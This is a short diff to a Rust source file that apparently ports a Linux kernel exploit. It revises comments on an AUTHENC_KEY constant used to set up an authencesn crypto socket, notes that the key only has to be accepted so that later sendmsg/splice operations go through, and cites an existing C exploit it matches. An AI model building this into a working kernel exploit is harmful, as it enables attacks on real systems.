@@ -15,8 +15,10 @@ pub const AAD_LEN: u32 = 8;
 
 // authencesn key layout (kernel crypto_authenc_extractkeys):
 //   rtattr { u16 rta_len=8 (LE); u16 rta_type=1 (LE, CRYPTO_AUTHENC_KEYA_PARAM) }
-//   __be32 enckeylen = 16  (selects AES-128 for cbc(aes))
+//   __be32 enckeylen = 16  (BE -> bytes 00 00 00 10; selects AES-128)
 //   auth_key[16] (HMAC-SHA256 truncated key) + enc_key[16] (AES-128 key)
+// Values are irrelevant; setkey only needs to succeed so subsequent
+// sendmsg/splice ops are accepted. Matches tgies/copy-fail-c exploit.c.
 pub const AUTHENC_KEY: [u8; 40] = [
     0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10,
     b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A',
